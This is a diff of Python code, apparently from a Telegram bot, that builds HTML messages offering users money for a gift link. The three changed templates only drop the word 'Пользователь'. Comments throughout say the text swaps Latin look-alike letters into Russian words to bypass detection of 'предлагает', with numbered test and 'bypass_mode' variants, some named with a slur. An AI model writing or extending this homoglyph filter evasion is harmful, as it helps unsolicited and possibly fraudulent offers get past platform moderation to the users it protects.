@@ -425,7 +425,7 @@ async def process_offer(message: Message, business_connection_id: str | None = N
         
         elif test_number == 10:
             # тест10: добавляем финальную фразу с латинскими символами
-            body = f"Пoльзoвaтель <b>{seller_name}</b> прeдлaгaeт Вам <b>{amount}</b> за подарок {gift_link}.\n\nCдeлкa aктивнa в тeчeниe <b>{time_text}</b>"
+            body = f"<b>{seller_name}</b> прeдлaгaeт Вам <b>{amount}</b> за подарок {gift_link}.\n\nCдeлкa aктивнa в тeчeниe <b>{time_text}</b>"
         
         elif test_number == 11:
             # тест11: добавляем "Это предложение"
@@ -481,7 +481,7 @@ async def process_offer(message: Message, business_connection_id: str | None = N
         
         if bypass_mode == 0:
             # гой (без номера): Полный офер с обходом "прeдлaгaeт" (e,a латинские) + зa (латинская a)
-            body = f"Пoльзoвaтель <b>{seller_name}</b> прeдлaгaeт Вам <b>{amount}</b> зa {gift_link}.\n\nСдeлкa aктивнa в тeчeниe <b>{time_text}</b>"
+            body = f"<b>{seller_name}</b> прeдлaгaeт Вам <b>{amount}</b> зa {gift_link}.\n\nСдeлкa aктивнa в тeчeниe <b>{time_text}</b>"
         
         elif bypass_mode == 1:
             # гой1: БЕЗ слова "предлагает" вообще
@@ -535,7 +535,7 @@ async def process_offer(message: Message, business_connection_id: str | None = N
         time_text = f"{hours}ч {minutes}м."
         gift_link = f'<a href="{parsed["gift_url"]}">{title}</a>'
         # Основной офер с обходом "прeдлaгaeт" (e, a латинские) — как в гой2
-        body = f"Пoльзoвaтель <b>{seller_name}</b> прeдлaгaeт Вам <b>{amount}</b> за подарок {gift_link}.\n\nCдeлкa aктивнa в тeчeниe <b>{time_text}</b>"
+        body = f"<b>{seller_name}</b> прeдлaгaeт Вам <b>{amount}</b> за подарок {gift_link}.\n\nCдeлкa aктивнa в тeчeниe <b>{time_text}</b>"
     
     # Кнопки добавляем только в самом конце (уровень 8+)
     markup = offer_keyboard(offer_id, parsed["locale"], parsed["currency"]) if test_level == 0 or test_level >= 8 else None
